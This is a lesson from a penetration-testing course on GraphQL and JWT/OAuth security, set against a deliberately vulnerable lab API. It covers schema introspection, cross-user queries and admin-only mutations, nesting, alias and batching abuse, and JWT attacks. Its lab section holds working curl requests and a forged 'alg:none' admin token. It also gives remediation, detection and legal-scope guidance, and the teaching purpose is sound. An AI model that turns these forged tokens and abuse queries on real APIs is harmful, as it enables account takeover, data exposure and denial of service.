# 08.2 — GraphQL &amp; token security: introspection, query abuse, JWT/OAuth pitfalls, versioning &amp; undocumented endpoints

<div class="prereq">

**Prerequisites:** [M00](../module-00/lesson-01.md) (authorization boundary); [01.2 DNS, HTTP &amp;
TLS](../module-01/lesson-02.md) (HTTP, headers, tokens); **M07 Web application testing** (JWT, OAuth/OIDC,
sessions, SSRF are introduced there — this lesson applies them to APIs, it does not re-derive them);
and [08.1 REST API testing](lesson-01.md) — BOLA/BFLA, mass assignment, and the "authorize the
action, not the identity" principle carry directly into GraphQL.
**Module:** M08 API security. **Difficulty:** 🔴 advanced.
**You will produce:** a GraphQL schema map built from introspection and one *verified* finding —
either an authorization gap or a resource-abuse vector — plus a token-handling review with impact
and fixes.

</div>

## Why this matters

GraphQL collapses an entire API behind **one endpoint** and hands the client a query language
powerful enough to ask for anything the schema allows, in any shape, to any depth. That power moves
the security burden: there are no per-URL routes to protect, so the old "lock down the endpoint"
instinct fails, and authorization must live on *every field and every resolver*. Meanwhile the token
that carries identity across REST and GraphQL alike — usually a **JWT** minted by an **OAuth/OIDC**
flow — is itself a rich attack surface: a single validation mistake (accepting `alg:none`, trusting
an unverified claim, ignoring the audience) turns "authenticated" into "impersonate anyone." This
lesson covers the two things that most often break modern APIs: the GraphQL execution model, and the
tokens every API trusts. Together they close the OWASP API Top 10 (2023), especially **API2** Broken
Authentication, **API4** Unrestricted Resource Consumption, **API8** Misconfiguration, and **API9/API10**
inventory and unsafe consumption.

## Learning objectives

By the end you can:

- Explain the GraphQL model — single endpoint, schema, queries vs. mutations vs. subscriptions,
  resolvers — and why it changes where authorization must live.
- Use **introspection** to dump a full schema and reason about the attack surface (API9).
- Recognize and demonstrate **query depth / nesting / aliasing / batching abuse** as a
  resource-consumption vector (API4).
- Test **authorization in GraphQL** (BOLA/BFLA on fields and mutations, API1/API5) and understand why
  it is easy to get wrong.
- Analyze **JWT** validation flaws (`alg` confusion, unverified signature, claim tampering, `kid`
  abuse) and **OAuth 2.0** scope/audience pitfalls (API2).
- Find undocumented and legacy surface — old `/v1`, staging endpoints, debug consoles (API9) — and
  reason about **unsafe consumption** of upstream APIs (API10).

## Intuition

REST gives the server control of the response shape: each URL returns a fixed thing. **GraphQL
inverts this** — the *client* dictates the shape, depth, and breadth of the response from a typed
**schema**. That is wonderful for developers and dangerous for defenders, because a single request
can traverse the whole object graph (`user → orders → items → seller → user → orders …`), select
sensitive fields the UI never renders, or ask the same expensive question a thousand times via
aliases. The server must therefore make an authorization decision at *every field it resolves*, and
enforce *cost limits* on queries it cannot predict. Most GraphQL bugs are one of two failures: a
**resolver that returns data without checking who's asking** (authorization), or an **executor that
runs a query without checking how much it costs** (resource consumption).

The token layer is the same confused-deputy story as ever: the server trusts a signed statement of
identity. If it validates that signature *incorrectly*, or trusts a claim the client can influence,
the deputy is confused about who it's serving.

## The underlying technology

### GraphQL

- **One endpoint**, almost always `POST /graphql` (sometimes `/api/graphql`, `/query`, `/v1/graphql`).
  The request body is a query string plus optional variables.
- **Schema** — a strongly typed contract: `Query` (reads), `Mutation` (writes), `Subscription`
  (streams), and object types with fields. The schema *is* the attack surface.
- **Resolvers** — the server functions that fetch each field. Authorization must happen here, per
  field, because there is no URL to guard.
- **Introspection** — a built-in meta-query (`__schema`, `__type`) that returns the entire schema.
  It powers tooling (GraphiQL, docs) and, left enabled on a production API, hands a tester the map.

A minimal query and its shape-dictating nature:

```graphql
# The client chooses exactly which fields come back — and how deep to go.
query { me { id email orders { id total items { name price } } } }
```

### Tokens: JWT and OAuth/OIDC

A **JWT** (RFC 7519) is `base64url(header).base64url(payload).signature`. The header names the
algorithm (`alg`); the payload carries claims (`sub`, `role`, `scope`, `aud`, `iss`, `exp`); the
signature is computed over header+payload with either a shared secret (HMAC, `HS256`) or a private
key (RSA/EC, `RS256`). **OAuth 2.0** (RFC 6749) is the *delegation* framework that issues these
tokens; **OIDC** layers identity on top. The claims a token asserts — `scope`, `aud`, `role` — are
only trustworthy if the server **verifies the signature and validates the claims**. Every JWT bug is
a failure of one of those two steps.

## Why the weakness exists

- **GraphQL authorization** is per-field and easy to forget: developers add a resolver, wire it to
  the data layer, and ship — the field is now reachable by anyone who can name it, unless a check was
  added. There is no route to slap `[Authorize]` on.
- **Introspection and dev consoles** ship enabled by default in many frameworks; leaving them on in
  production is a misconfiguration (API8) that also defeats "security by obscurity."
- **Query cost** is unbounded by default: the executor will happily resolve a query nested 15 levels
  deep or aliased 1,000 times, because nothing caps it (CWE-770).
- **JWT validation** is subtly hard: libraries historically honored the *token's own* `alg` header,
  so an attacker could switch `RS256`→`HS256` (**algorithm confusion**, using the public key as the
  HMAC secret) or set `alg:none` (**no signature at all**). Trusting any claim without verifying the
  signature (CWE-347, improper verification), or ignoring `exp`/`aud`/`iss`, breaks the whole model.
- **OAuth scope** creep and missing **audience** checks let a token minted for one service be
  replayed at another (API2).

## How a tester recognizes it

- A `POST /graphql` that answers an **introspection query** — schema fully readable (API9/API8).
- A single query that **nests deeply** or accepts **many aliases** and the response time or size
  climbs — no cost control (API4).
- A field or mutation that returns/mutates another user's data regardless of who asks (BOLA/BFLA in
  GraphQL, API1/API5).
- A JWT whose header shows `alg:none`, or an API that still accepts a token after you flip the `alg`
  or strip the signature — **broken authentication** (API2).
- Claims like `"role":"user"` or `"scope":"read"` sitting in a token whose signature the server may
  not be checking — try tampering and see if it's accepted.
- Old `/v1`, `/graphql` alongside `/api/v2`, `/graphiql`, `/altair`, `/debug` — legacy and dev
  surface (API9).

## Manual investigation

### 1. Confirm the endpoint and dump the schema (introspection)

```bash
# LAB TARGET ONLY (api.shop.lab). A trivial query confirms a GraphQL endpoint.
curl -s https://api.shop.lab/graphql -H 'Content-Type: application/json' \
     -d '{"query":"{ __typename }"}'
# Full schema via introspection — the tester's map.
curl -s https://api.shop.lab/graphql -H 'Content-Type: application/json' \
     -d '{"query":"query{__schema{types{name fields{name args{name} type{name kind ofType{name}}}}}}"}' \
     | jq '.data.__schema.types[] | select(.fields) | {name, fields:[.fields[].name]}'
```

If introspection is disabled, you are not blind: error messages often **suggest field names** ("Did
you mean `email`?"), the SPA's JS bundle contains the queries it sends, and tools can *guess* the
schema by probing. But an enabled introspection endpoint is the fast path — read the `Query`,
`Mutation`, and object types, and note anything named `admin`, `internal`, `user`, `secret`.

### 2. Test authorization on fields and mutations (API1/API5 in GraphQL)

The BOLA/BFLA logic from 08.1 applies per field. Ask for an object you shouldn't see, or call a
mutation you shouldn't be allowed to run, with your ordinary token:

```graphql
# BOLA: request another user's node by id, with YOUR token.
query { user(id: 1002) { id email orders { id total } } }

# BFLA: invoke an admin-only mutation as a normal user.
mutation { deleteUser(id: 1002) { ok } }
mutation { setRole(userId: 1001, role: "admin") { id role } }   # mass assignment's GraphQL cousin
```

If the resolver returns the data or performs the mutation, authorization is missing *at that field*.
GraphQL makes partial failure visible: a query can return `data` for the fields you're allowed and
`errors` for the ones you aren't — read both.

### 3. Resource-consumption abuse (API4)

Three inexpensive, *bounded* probes reveal missing cost control. Keep them small — you are
demonstrating the mechanism, not launching a DoS.

**Depth / circular nesting** — the graph loops, so depth is a multiplier:

```graphql
query { user(id:1001){ orders { seller { orders { seller { orders { id } } } } } } }
```

**Aliasing** — the same expensive field requested many times in one request bypasses naive
per-operation limits (this is also how login/OTP brute force hides in one HTTP request):

```graphql
query { a:user(id:1001){email} b:user(id:1002){email} c:user(id:1003){email} }  # …extended, bounded
```

**Batching** — many operations in one JSON array (`[{ "query": "..."}, { "query": "..."}]`), one
round trip, N executions. Watch response time/size grow with N; a server with no depth limit,
alias/`cost` limit, or batch cap is vulnerable (CWE-770). Verify by comparing latency at N=1 vs a
small N — do not scale up.

### 4. Token analysis (API2)

Decode the JWT (never trust it — *decode* it) and read the header and claims:

```bash
# Decode header and payload (no verification — just reading the base64url parts).
T="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOjEwMDEsInJvbGUiOiJ1c2VyIn0.<sig>"
echo "$T" | cut -d. -f1 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
echo "$T" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null; echo
# → {"alg":"HS256"}   {"sub":1001,"role":"user"}
```

Then test whether the server actually **verifies** it (lab target only):

- **`alg:none`** — set header `{"alg":"none"}`, keep the payload, send an empty signature. If
  accepted, the server never checks the signature (CWE-347).
- **Claim tampering** — change `"role":"user"` → `"admin"` and re-send with the original signature.
  If accepted, the signature isn't validated against the payload.
- **Algorithm confusion** — a service verifying `RS256` with a public key that also accepts `HS256`
  can be tricked into using the *public* key as the HMAC secret; forge a token signed `HS256` with
  that public key.
- **`kid` injection** — the `kid` header selects the key; if it's used to build a file path or SQL
  lookup, it may be injectable to point verification at a key you control.
- **Expiry/audience** — remove or extend `exp`; send a token whose `aud`/`iss` names a *different*
  service. If honored, temporal and audience validation is missing.

### 5. Inventory and unsafe consumption (API9 / API10)

Probe for legacy and dev surface: `/graphql` vs `/api/v2/graphql`, `/graphiql`, `/altair`,
`/playground`, `/v1/*` REST paths retired from the docs. For **API10**, note where the API itself
*consumes* third-party/upstream APIs and whether it trusts their responses or follows their
redirects blindly (an SSRF / injection channel — cross-reference API7 SSRF and M07).

## Tooling — what it does, key options, limits, verify by hand

- **GraphiQL / Altair / Apollo Sandbox** — interactive clients that *use* introspection to give you
  schema-aware autocomplete. *Limit:* need introspection (or a supplied schema). *Verify:* the raw
  `POST` body is what matters.
- **`graphql-cog` / `clairvoyance`** — recover a schema when introspection is **disabled**, by
  abusing field-suggestion error messages. *Limit:* partial/slow; noisy. *Verify:* confirm guessed
  fields actually resolve.
- **`graphw00f`** — fingerprints the GraphQL *engine* (Apollo, graphql-js, Hasura…), which predicts
  default protections and known quirks. *Limit:* fingerprint only. *Verify:* test the actual behavior.
- **`InQL` (Burp extension)** — parses a schema into ready queries/mutations and integrates with
  Repeater for auth testing. *Limit:* it lists surface, not vulnerabilities. *Verify:* run the auth
  test yourself.
- **`jwt_tool`** — enumerates JWT attacks (`alg:none`, HS/RS confusion, `kid` tricks, secret
  cracking with a wordlist). *Limit:* HMAC-secret cracking only works on weak secrets; report it as a
  *possibility*, not a guarantee. *Verify:* re-send the forged token and confirm a privileged action
  succeeds.
- **`jwt.io` decoder** — read claims by hand. *Limit:* paste tokens only for lab/synthetic values,
  never a real user's token (it leaves your machine).

<div class="callout warn">

**Do not paste real tokens into web decoders.** `jwt.io` and similar send the token off your machine.
For real engagements, decode locally (the `base64 -d` above); a Bearer token is a live credential
and pasting it into a third-party site is itself a disclosure.

</div>

## Exploitation / demonstration (LAB ONLY)

<div class="callout attack">

**Technique — introspection → unauthorized field (API9 + API1).** Dump the schema, spot a
privileged field, then read it with an ordinary token:

```bash
# 1) Schema reveals a Query field `allUsers` and object field `user.ssnLast4`.
curl -s https://api.shop.lab/graphql -H 'Content-Type: application/json' \
     -d '{"query":"{__schema{queryType{fields{name}}}}"}' | jq
# 2) Call it as normal user A — the resolver never checks the caller's role.
curl -s https://api.shop.lab/graphql -H "Authorization: Bearer $TOKEN_A" \
     -H 'Content-Type: application/json' \
     -d '{"query":"{ user(id:1002){ email ssnLast4 marker } }"}' | jq
# → {"data":{"user":{"email":"userB@shop.lab","ssnLast4":"0042","marker":"LAB-FLAG-{uuid}"}}}
```

**Why it works:** introspection exposed a field the UI never uses (`ssnLast4`) and a resolver that
returns any user by id without an ownership/role check — GraphQL BOLA plus excessive data exposure at
the field level. The `LAB-FLAG-{uuid}` proves cross-user access.

</div>

<div class="callout attack">

**Technique — JWT claim tampering (API2).** The lab issues an `HS256` token but fails to verify the
signature against the payload:

```bash
# Original decodes to {"sub":1001,"role":"user"}. Forge role=admin with an empty/none sig (LAB).
FORGED='eyJhbGciOiJub25lIn0.eyJzdWIiOjEwMDEsInJvbGUiOiJhZG1pbiJ9.'
curl -s https://api.shop.lab/graphql -H "Authorization: Bearer $FORGED" \
     -H 'Content-Type: application/json' \
     -d '{"query":"mutation{ setRole(userId:1001, role:\"admin\"){ id role } }"}' | jq
# → {"data":{"setRole":{"id":1001,"role":"admin"}}}  (accepted → signature never verified)
```

**Why it works:** the server trusted the token's own `alg` header (`none`) and never validated the
signature over the payload (CWE-347), so a client-chosen `role` claim was believed. The fix is to
pin the accepted algorithm server-side and verify the signature on every request.

</div>

<div class="callout legal">

**LAB TARGET vs REAL SYSTEM.** Every request targets `labs/lab-08-api` (`api.shop.lab`) on the
isolated network, with **synthetic** users, **benign** `LAB-FLAG-{uuid}` markers, and lab-only signing
secrets. Forging a JWT, running deep/batched queries, or reading another user's fields against a
system you do not own and are not explicitly authorized to test is unlawful (M00); on a real API a
forged admin token is account takeover and a deep query is a denial-of-service — usually **out of
RoE** (00.1). Bound every resource-abuse probe (N=1 vs small N) and never scale it. Restate scope and
authorization before every action.

</div>

## Verification

- **GraphQL authz:** the query/mutation, the *decoded* token showing a non-privileged identity, and
  the `data` block containing another user's field or the completed mutation. Include the `errors`
  block if partial, to show exactly which fields resolved.
- **Resource abuse:** paired measurements — response time/size at N=1 vs a small N (depth, alias
  count, or batch size) — showing growth with no `429`/limit. State the multiplier, not a flood.
- **JWT flaw:** the original decoded claims, the tampered/forged token, and a privileged action that
  **succeeded** with it. Acceptance is the proof; a decoded token alone proves nothing.
- **Introspection/inventory:** the schema (or the legacy/dev endpoint) returned to an unauthenticated
  or low-priv caller.

## Impact

A missing field-level check in GraphQL is **mass data exposure and privilege escalation across the
whole graph** — one query can pull fields from every reachable type. Unbounded query cost is a
**denial-of-service** primitive (a single crafted request can exhaust CPU/DB). A JWT verification flaw
is **total authentication bypass**: forge any identity, any role, and every downstream authorization
decision that trusts the token collapses. OAuth scope/audience errors let a token cross service
boundaries it was never meant to. Frame each against the asset (customer data, availability,
identity) in the report (M16); "ran a big query" understates a DoS, and "changed a claim" understates
account takeover.

## Remediation

<div class="callout defend">

- **GraphQL authorization (API1/API5):** enforce checks in resolvers (or a middleware/policy layer)
  on every field and mutation; deny by default. Scope object lookups to the caller (as in 08.1). Do
  not rely on hiding fields — hidden ≠ protected.
- **Introspection &amp; consoles (API8):** disable introspection and GraphiQL/Playground in
  production; return generic errors (no field suggestions) to unauthenticated callers.
- **Resource consumption (API4):** enforce **query depth limits**, **complexity/cost analysis**,
  **alias and batch caps**, pagination limits, and timeouts. Rate-limit per identity. Persisted
  queries (allow-list of known operations) eliminate arbitrary queries entirely.
- **JWT (API2):** verify the signature on every request; **pin the accepted algorithm server-side**
  (never trust the token's `alg`); reject `none`; separate HMAC vs. asymmetric keys so RS/HS
  confusion is impossible; validate `exp`, `nbf`, `iss`, and **`aud`**; use strong secrets/managed
  keys; rotate via `kid` from a trusted key set (JWKS), never a client-controlled path.
- **OAuth (API2):** issue least-privilege **scopes**, validate scope *and* audience per resource
  server, short token lifetimes, and use refresh-token rotation. Keep client secrets out of
  browsers/mobile bundles.
- **Inventory (API9) &amp; consumption (API10):** retire old versions; document and gate every
  endpoint; validate and sanitize data received *from* upstream APIs; never blindly follow their
  redirects (SSRF, API7).

</div>

## Detection / blue-team view

<div class="callout defend">

- **GraphQL abuse:** log operation name, depth, complexity, alias count, and batch size per request;
  alert on introspection queries from production clients, on queries exceeding depth/cost thresholds,
  and on high alias/batch counts (brute force or DoS). Enforce with a gateway that computes query
  cost.
- **Authorization:** the same *(subject, object/field, decision)* logging as 08.1 — a `user`-role
  token resolving admin fields or mutations is the signal.
- **Token abuse:** alert on `alg:none` or unexpected `alg`, on signature-verification failures, on
  tokens presented after `exp`, and on a token used at a resource server outside its `aud`. A sudden
  role/scope change relative to the issuer's records is a tamper indicator.
- **Inventory:** traffic to `/graphiql`, `/playground`, legacy `/v1`, or deprecated schema fields.

Maps to **MITRE ATT&CK T1078** (Valid Accounts — forged/abused tokens), **T1190** (Exploit
Public-Facing Application — introspection/misconfig), and endpoint-exhaustion as impact. The traffic
is well-formed, so **behavioral** limits and authorization logging — not signatures — are what catch it.

</div>

## Practical lab

<div class="lab">

**Environment:** `labs/lab-08-api` (built separately) — the same deliberately vulnerable API as 08.1,
here via its **GraphQL** endpoint (`POST /graphql`) with introspection enabled, missing field-level
authorization, no query-cost limits, and a JWT layer that fails to validate signatures/claims.
Synthetic users (A `1001`, B `1002`), an admin you do **not** hold, `LAB-FLAG-{uuid}` markers in other
users' fields, and lab-only signing secrets. **Access:** log in as user A for a token. **Targets:**
the lab API only (`api.shop.lab`). **Time:** ~90 min. **Isolation:** private Docker network, no
Internet route; reset per the lab README between attempts.

</div>

Work in order: confirm the endpoint and dump the schema by introspection; map `Query`/`Mutation` and
flag privileged/sensitive fields; test one authorization gap (a field or mutation) with paired
evidence; run *one bounded* resource-abuse probe (depth **or** aliasing **or** batching) and record
N=1 vs small-N timing; then decode your JWT and test whether the server verifies it. Reset and predict
which requests your proposed fixes would now reject.

## Exercise

<div class="callout method">

**Situation.** Authorized grey-box test of the lab API's GraphQL surface. You hold **one** ordinary
user's credentials (user A, `1001`) and no documentation. The client says "GraphQL is internal-only
and safe."

**Objective.** (1) Map the schema using introspection (or field-suggestion recovery if it's off).
(2) Find and **prove** *one* flaw — either an authorization gap (a field/mutation you shouldn't
reach) **or** a resource-abuse vector (depth/alias/batch with no cost control) — with reproducible
evidence, impact, and fix. (3) Do a short **token review**: decode your JWT, and test one validation
assumption (e.g. does the server accept a tampered claim?).

**Starting information.** User A's login; base host `api.shop.lab`; the GraphQL endpoint is somewhere
under it (find it).

**Constraints.** Lab target only. Any resource-abuse probe must be **bounded** (N=1 vs a small N) —
you are demonstrating the mechanism, not running a DoS, which would be out of RoE on a real target.
For authorization, read the minimum to prove cross-user access (one `LAB-FLAG-{uuid}`), not every
record. Decode tokens **locally**; never paste a token into a web service. Explain the **mechanism**
for whichever flaw you pick.

**Expected deliverables.**
1. The GraphQL endpoint location and how you found it; a schema map (types, `Query`/`Mutation`
   fields) and how you obtained it (introspection or recovery), with sensitive fields flagged.
2. One proven flaw with evidence: for authz, the query + decoded low-priv token + returned data; for
   resource abuse, the N=1 vs small-N measurements and the absent limit.
3. A token review: your decoded claims, the one validation test you ran, and the result.
4. **Impact** (asset-based), **remediation**, and **detection** for your finding; plus a note on what
   you bounded/avoided and why.

</div>

<details><summary>Hint 1 — conceptual direction</summary>
GraphQL has no per-URL route to protect, so the check must live on every field/resolver — and cost
must be capped because the client chooses the query shape. Your flaw is either "a resolver that
returns data without checking who's asking" or "an executor that runs a query without checking how
expensive it is."
</details>

<details><summary>Hint 2 — discovery</summary>
Confirm the endpoint with <code>{ __typename }</code>. Then send an introspection query
(<code>__schema</code>) and read <code>Query</code>/<code>Mutation</code> field names — anything
called <code>all…</code>, <code>admin…</code>, <code>internal…</code>, or a field like
<code>ssnLast4</code>/<code>role</code> is a lead. If introspection is off, provoke a
"did you mean…" error to recover field names.
</details>

<details><summary>Hint 3 — where to look</summary>
For authz: request another user's node by id, or call a mutation the UI hides, with your own token —
read both <code>data</code> and <code>errors</code>. For resource abuse: the object graph loops
(user→orders→seller→orders…), so nest a few levels, or alias the same field several times, and watch
latency at N=1 vs a small N.
</details>

<details><summary>Hint 4 — token direction</summary>
Decode the two base64url segments locally. Note the <code>alg</code> and the <code>role</code>/<code>scope</code>
claims. Test <em>one</em> assumption: does the server still accept the token if you flip the claim (or
set <code>alg:none</code>)? Acceptance — a privileged action succeeding — is the proof, not the
decode.
</details>

## Check yourself

<div class="callout key">

1. Why does "protect the endpoint" fail as a security model for GraphQL, and where must the
   authorization check actually live?
2. Introspection is disabled on a production GraphQL API. Are you blind? Name two ways you can still
   recover schema information.
3. A single GraphQL request with 500 aliases of the same `login`-style field slips past a
   "one operation per request" limit. Which OWASP API risk is this, and which two server-side controls
   stop it?
4. A JWT decodes to `{"alg":"none","role":"admin"}` and the API accepts it. Which validation step was
   skipped, and what is the correct server-side rule about the `alg` header?
5. An `RS256` token is verified with the server's public key, and the server also accepts `HS256`.
   Explain the algorithm-confusion attack in one or two sentences, and the fix.
6. Why is pasting a real production Bearer token into `jwt.io` itself a security incident?

</div>

Model answers are in `solutions/module-08.md` (try them before looking).

## References

- **OWASP API Security Top 10 (2023)** — **API1** BOLA; **API2** Broken Authentication; **API3**
  Broken Object Property Level Authorization; **API4** Unrestricted Resource Consumption; **API5**
  BFLA; **API7** Server Side Request Forgery; **API8** Security Misconfiguration; **API9** Improper
  Inventory Management; **API10** Unsafe Consumption of APIs. (owasp.org/API-Security)
- **OWASP Testing** — GraphQL Cheat Sheet; JSON Web Token Cheat Sheet; Authorization Cheat Sheet.
- **GraphQL Specification** — spec.graphql.org (introspection, execution, type system).
- **RFC 7519** — JSON Web Token (JWT); **RFC 7515** — JSON Web Signature; **RFC 7518** — JWA
  (algorithms, including the `none` value and why it's dangerous); **RFC 7517** — JSON Web Key (JWKS);
  **RFC 8725** — JWT Best Current Practices (algorithm confirmation, `alg` pinning).
- **RFC 6749** — OAuth 2.0; **RFC 6750** — Bearer Token Usage; **RFC 9700** — OAuth 2.0 Security Best
  Current Practice; **OpenID Connect Core**.
- **CWE-347** Improper Verification of Cryptographic Signature; **CWE-770** Allocation of Resources
  Without Limits or Throttling; **CWE-639** Authorization Bypass Through User-Controlled Key;
  **CWE-285** Improper Authorization; **CWE-863** Incorrect Authorization.
- **MITRE ATT&CK** — **T1078** Valid Accounts; **T1190** Exploit Public-Facing Application.

## What you should now be able to do

- Explain the GraphQL model and why authorization must be enforced per field/resolver.
- Dump a schema with introspection (and recover it when introspection is off).
- Demonstrate depth/alias/batch resource abuse with bounded, non-destructive evidence.
- Test GraphQL authorization and JWT/OAuth validation, and explain the exact step that fails.
- Find legacy/undocumented surface and reason about unsafe upstream consumption.
- Produce evidence, impact, remediation, and detection for token and GraphQL findings.

## Progress checkpoint

```bash
py course.py complete 08.2
```
